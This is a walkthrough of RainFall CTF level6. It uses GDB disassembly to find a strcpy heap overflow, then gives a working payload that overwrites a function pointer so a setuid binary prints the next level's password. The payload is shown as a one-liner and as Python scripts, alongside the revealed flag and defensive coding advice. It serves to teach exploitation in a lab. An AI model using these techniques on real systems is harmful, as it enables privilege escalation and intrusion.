# RainFall CTF – Level6 Heap Exploitation Walkthrough
## Complete Guide to Function Pointer Overwrite Attack

### 🎯 Objective
Exploit a heap-based buffer overflow vulnerability to overwrite a function pointer, redirecting program execution to a hidden function that reveals the password for level7.

---


## 🔍 Initial Analysis and Setup

### Environment Overview

```bash
level6@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep  3  2015 .bashrc
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
```

### Key Observations:
- **SUID Binary**: Owned by `level7` with setuid privileges
- **File Size**: 5274 bytes - moderate complexity program
- **Execution Context**: Runs with level7 user privileges

### Basic Functionality Test

```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)

level6@RainFall:~$ ./level6 "Hello World"
Nope

level6@RainFall:~$ ./level6 "AAAAAAAA"
Nope
```

**Initial Assessment**:
- Program requires command-line argument
- Default behavior prints "Nope"
- Potential for argument-based exploitation

---

## 🔍 Binary Architecture Analysis

### Complete Function Disassembly

#### Main Function Analysis

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp      # Stack alignment
   0x08048482 <+6>:	sub    $0x20,%esp            # Allocate 32 bytes
   0x08048485 <+9>:	movl   $0x40,(%esp)          # malloc(64) - buffer
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)       # Store buffer pointer
   0x08048495 <+25>:	movl   $0x4,(%esp)           # malloc(4) - func pointer
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)       # Store func pointer
   0x080484a5 <+41>:	mov    $0x8048468,%edx       # Address of m()
   0x080484aa <+46>:	mov    0x18(%esp),%eax       # Get func pointer
   0x080484ae <+50>:	mov    %edx,(%eax)           # *func_ptr = m()
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax        # argv
   0x080484b3 <+55>:	add    $0x4,%eax             # argv[1]
   0x080484b6 <+58>:	mov    (%eax),%eax           # Get argv[1] string
   0x080484b8 <+60>:	mov    %eax,%edx             # Source = argv[1]
   0x080484ba <+62>:	mov    0x1c(%esp),%eax       # Get buffer
   0x080484be <+66>:	mov    %edx,0x4(%esp)        # Set source
   0x080484c2 <+70>:	mov    %eax,(%esp)           # Set destination
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> # VULNERABILITY!
   0x080484ca <+78>:	mov    0x18(%esp),%eax       # Get func pointer
   0x080484ce <+82>:	mov    (%eax),%eax           # Dereference it
   0x080484d0 <+84>:	call   *%eax                 # Call function
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.
```

### Program Flow Analysis

```
Program Execution Flow:
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  malloc(64)     │───▶│  malloc(4)      │───▶│ *func_ptr = m() │
│  (buffer)       │    │ (func pointer)  │    │                 │
└─────────────────┘    └─────────────────┘    └─────────────────┘
        │                       │                       │
        ▼                       ▼                       ▼
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│ strcpy(buffer,  │───▶│ Dereference     │───▶│   call *ptr     │
│   argv[1])      │    │ func_ptr        │    │ (Execute func)  │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

---

## 🧠 Heap Memory Layout Investigation

### Understanding Heap Allocation

The program makes two sequential `malloc()` calls:

1. **Buffer Allocation**: 64 bytes for input storage
2. **Function Pointer**: 4 bytes for function address storage

### GDB Memory Analysis

```bash
(gdb) break *0x080484ca    # Break before function call
(gdb) run "AAAABBBBCCCCDDDD"
Starting program: /home/user/level6/level6 "AAAABBBBCCCCDDDD"

Breakpoint 1, 0x080484ca in main ()

(gdb) x/20wx $esp
0xbffff6e0:	0x0804a008	0x0804a050	0x08048468	0x0804a008
0xbffff6f0:	0xbffff89e	0xbffff700	0x00000000	0xb7e454d3
0xbffff700:	0x00000002	0xbffff724	0xbffff730	0xb7fdc858

(gdb) x/20wx 0x0804a008    # Examine buffer
0x804a008:	0x41414141	0x42424242	0x43434343	0x44444444
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
...

(gdb) x/wx 0x0804a050     # Examine function pointer
0x804a050:	0x08048468    # Points to m() function
```

### Heap Layout Discovery

```
Heap Memory Layout:
┌─────────────────────┐ 0x0804a000
│   Heap metadata     │
├─────────────────────┤ 0x0804a008  ← Buffer start
│                     │
│   64-byte buffer    │ ← strcpy() writes here
│   (User input)      │
│                     │
├─────────────────────┤ 0x0804a048  ← Buffer end
│   Heap chunk        │
│   metadata          │ ← 8 bytes of malloc bookkeeping
├─────────────────────┤ 0x0804a050  ← Function pointer location
│  Function pointer   │ ← Initially points to m() (0x08048468)
│   (4 bytes)         │
└─────────────────────┘ 0x0804a054
```

### Critical Distance Calculation

**Buffer start**: `0x0804a008`  
**Function pointer**: `0x0804a050`  
**Distance**: `0x0804a050 - 0x0804a008 = 72 bytes`

---

## 🚨 Vulnerability Assessment

### Buffer Overflow Analysis

The vulnerability lies in the `strcpy()` function call:

```c
// Pseudo-code representation:
char *buffer = malloc(64);
char **func_ptr = malloc(4);
*func_ptr = &m;                    // Set to m() function
strcpy(buffer, argv[1]);           // NO BOUNDS CHECKING!
(*func_ptr)();                     // Call whatever func_ptr points to
```

### Attack Vector:

1. **Heap-based Buffer Overflow**: `strcpy()` doesn't validate input length
2. **Adjacent Memory Corruption**: Function pointer is adjacent to buffer
3. **Control Flow Hijacking**: Can overwrite function pointer
4. **Arbitrary Code Execution**: Can redirect to any function

---

## 🎯 Function Analysis and Target Identification

### Available Functions Analysis

#### Function m() - Default Handler

```bash
(gdb) disassemble m
Dump of assembler code for function m:
   0x08048468 <+0>:	push   %ebp
   0x08048469 <+1>:	mov    %esp,%ebp
   0x0804846b <+3>:	sub    $0x18,%esp
   0x0804846e <+6>:	movl   $0x80485d1,(%esp)     # "Nope" string
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave  
   0x0804847b <+19>:	ret    
End of assembler dump.

(gdb) x/s 0x80485d1
0x80485d1:	"Nope"
```

**Function m() Purpose**:
- Default function called by main
- Simply prints "Nope" message
- Dead-end function (no useful output)

#### Function n() - Target Function

```bash
(gdb) disassemble n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)     # Command string
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.

(gdb) x/s 0x80485b0
0x80485b0:	"/bin/cat /home/user/level7/.pass"
```

**Function n() Purpose**:
- **Hidden backdoor function**
- Executes `system("/bin/cat /home/user/level7/.pass")`
- **Reveals level7 password**
- **Target for exploitation**

### Function Address Summary

| Function | Address | Purpose | Called By Default? |
|----------|---------|---------|-------------------|
| `m()` | 0x08048468 | Print "Nope" | ✅ Yes |
| `n()` | 0x08048454 | Show password | ❌ No (Hidden) |

---

## 💻 Heap Exploitation Strategy

### Attack Overview

Our goal is to redirect execution from `m()` to `n()` by overwriting the function pointer.

### Exploitation Steps:

1. **Calculate exact overflow distance** (72 bytes)
2. **Craft payload** to fill buffer + overwrite function pointer
3. **Replace function pointer** with address of `n()` function
4. **Trigger function call** to execute `n()` instead of `m()`

### Memory Corruption Visualization

```
Before Overflow (Normal):
┌─────────────────┐ 0x0804a008
│     Buffer      │ ← Contains legitimate data
│   (64 bytes)    │
├─────────────────┤ 0x0804a048
│ Heap metadata   │ ← Malloc bookkeeping
│   (8 bytes)     │
├─────────────────┤ 0x0804a050  
│  0x08048468     │ ← Points to m() function
│   (m() addr)    │
└─────────────────┘

After Overflow (Exploited):
┌─────────────────┐ 0x0804a008
│ AAAAAAAAAAAAA   │ ← 72 bytes of padding
│ AAAAAAAAAAAAA   │   (overwrites buffer + metadata)
│ AAAAAAAAAAAAA   │
├─────────────────┤ 0x0804a050
│  0x08048454     │ ← Now points to n() function!  
│   (n() addr)    │
└─────────────────┘
```

---

## 🔨 Memory Layout Mapping

### Detailed Byte-by-byte Analysis

```
Offset   Content              Description
────────────────────────────────────────────────────────
0-63     [User Input]        Original 64-byte buffer
64-71    [Heap Metadata]     Malloc chunk headers/bookkeeping
72-75    [Function Pointer]   Target for overwrite (4 bytes)
```

### Heap Chunk Structure

Modern malloc implementations use chunk headers:

```
Typical Heap Chunk:
┌─────────────────┐ ← Chunk start
│  prev_size      │ ← Previous chunk size (if free)
├─────────────────┤
│  size | flags   │ ← Current chunk size + status bits
├─────────────────┤ ← User data start
│                 │
│   User Data     │ ← Our 64-byte buffer
│   (64 bytes)    │
│                 │
└─────────────────┘ ← Next chunk start
```

### Why 72 Bytes?

1. **Buffer size**: 64 bytes allocated by `malloc(64)`
2. **Heap metadata**: 8 bytes of chunk management data
3. **Total distance**: 64 + 8 = 72 bytes to reach function pointer

---

## 🚀 Exploit Development

### Payload Construction Strategy

```python
# Exploit structure:
payload = padding + target_address

# Specific values:
padding = "A" * 72           # Fill buffer + heap metadata  
target_address = "\x54\x84\x04\x08"  # Address of n() in little-endian
```

### Address Format Conversion

**n() function address**: `0x08048454`  
**Little-endian representation**: `\x54\x84\x04\x08`

### Conversion Breakdown:
```
Big-endian:    08 04 84 54
Little-endian: 54 84 04 08
Hex escape:    \x54\x84\x04\x08
```

---

## 🧪 Payload Construction and Testing

### Method 1: Python Command Line

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

### Method 2: Detailed Python Script

```python
#!/usr/bin/env python2

# Target function address (n function)
target_addr = 0x08048454

# Convert to little-endian bytes
addr_bytes = ""
addr_bytes += chr((target_addr >> 0) & 0xFF)   # \x54
addr_bytes += chr((target_addr >> 8) & 0xFF)   # \x84  
addr_bytes += chr((target_addr >> 16) & 0xFF)  # \x04
addr_bytes += chr((target_addr >> 24) & 0xFF)  # \x08

# Build exploit payload
padding = "A" * 72  # Fill buffer + heap metadata
payload = padding + addr_bytes

print payload
```

### Method 3: Using struct Module

```python
#!/usr/bin/env python2
import struct

# Build payload using struct for clean little-endian conversion
n_function_addr = 0x08048454
padding = "A" * 72
payload = padding + struct.pack("<I", n_function_addr)

print payload
```

### Payload Verification

```bash
# Check payload length
python -c 'print "A"*72 + "\x54\x84\x04\x08"' | wc -c
76

# Examine payload in hex
python -c 'print "A"*72 + "\x54\x84\x04\x08"' | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 5484 0408            AAAAAAAAT...
```

---

## 🎯 Execution and Success

### Exploit Execution

```bash
level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

### What Happened:

1. **Buffer Overflow**: 72 bytes of 'A's overflow the buffer and heap metadata
2. **Function Pointer Overwrite**: Byte 73-76 overwrite the function pointer
3. **Execution Redirect**: Instead of calling `m()`, program calls `n()`
4. **System Command**: `n()` executes `system("/bin/cat /home/user/level7/.pass")`
5. **Password Revealed**: Level7 password is displayed

---

## 🎉 Success!

**Flag for level7**: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

### Continuing to Level7:

```bash
su level7
# Enter password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## 📚 Technical Deep Dive

### Understanding Heap Exploitation

#### 1. **Heap vs Stack Overflow Differences**

| Aspect | Stack Overflow | Heap Overflow |
|--------|---------------|---------------|
| **Location** | Stack memory | Heap memory |
| **Targets** | Return addresses | Data structures, function pointers |
| **Predictability** | More predictable layout | Less predictable, malloc-dependent |
| **Mitigation** | Stack canaries, ASLR | Heap cookies, metadata integrity |

#### 2. **Function Pointer Attacks**

This attack demonstrates **indirect control flow hijacking**:

```c
// Vulnerable pattern:
typedef void (*func_ptr_t)(void);
func_ptr_t handler = legitimate_function;
// ... buffer overflow occurs ...
handler();  // Calls attacker-controlled function
```

#### 3. **Heap Layout Dependencies**

The exploit depends on:
- **Sequential allocation**: `malloc()` calls allocate adjacent chunks
- **No ASLR**: Heap addresses are predictable
- **No heap protection**: No metadata integrity checks

### Modern Heap Protections (Not Present Here)

#### 1. **Heap Cookies/Canaries**
```c
// Modern malloc might include:
struct heap_chunk {
    size_t prev_size;
    size_t size_and_flags;
    uint32_t cookie;  // Random value to detect corruption
    // ... user data ...
};
```

#### 2. **Metadata Integrity Checks**
- Chunk size validation
- Forward/backward link verification  
- Double-free detection

#### 3. **Heap ASLR**
- Randomized heap base addresses
- Unpredictable chunk allocation patterns

### Real-World Implications

#### Historical Vulnerabilities:
- **Internet Explorer**: Heap spray attacks
- **Adobe Flash**: Use-after-free exploits  
- **Browser engines**: DOM object corruption
- **Media parsers**: Heap overflow in file processing

#### Attack Techniques:
- **Heap Spraying**: Fill heap with controlled data
- **Use-After-Free**: Access freed memory
- **Double-Free**: Corrupt malloc metadata
- **Heap Feng Shui**: Manipulate heap layout

### Defensive Programming Practices

#### 1. **Safe String Functions**
```c
// Unsafe:
strcpy(dest, src);

// Safe:
strncpy(dest, src, dest_size - 1);
dest[dest_size - 1] = '\0';

// Even better:
size_t copied = strlcpy(dest, src, dest_size);
if (copied >= dest_size) {
    // Handle truncation
}
```

#### 2. **Input Validation**
```c
// Always validate input length
if (strlen(user_input) > MAX_BUFFER_SIZE) {
    return ERROR_INPUT_TOO_LONG;
}
```

#### 3. **Secure Memory Management**
```c
// Clear sensitive data
void secure_free(void *ptr, size_t size) {
    if (ptr) {
        explicit_bzero(ptr, size);  // Clear memory
        free(ptr);
        ptr = NULL;  // Prevent use-after-free
    }
}
```

### Educational Value

This challenge teaches:
- **Heap memory layout** understanding
- **Function pointer manipulation** techniques
- **Adjacent memory corruption** concepts
- **Control flow hijacking** methods
- **Dynamic analysis** with GDB
- **Exploit development** methodology

### Compilation Flags for Protection

```bash
# Modern protection flags:
gcc -fstack-protector-strong    # Stack protection
    -D_FORTIFY_SOURCE=2        # Buffer overflow detection  
    -Wl,-z,relro              # Read-only relocations
    -Wl,-z,now                # Immediate symbol binding
    -pie -fPIE                # Position independent executable
    -Wl,-z,noexecstack        # Non-executable stack
    source.c -o binary
```
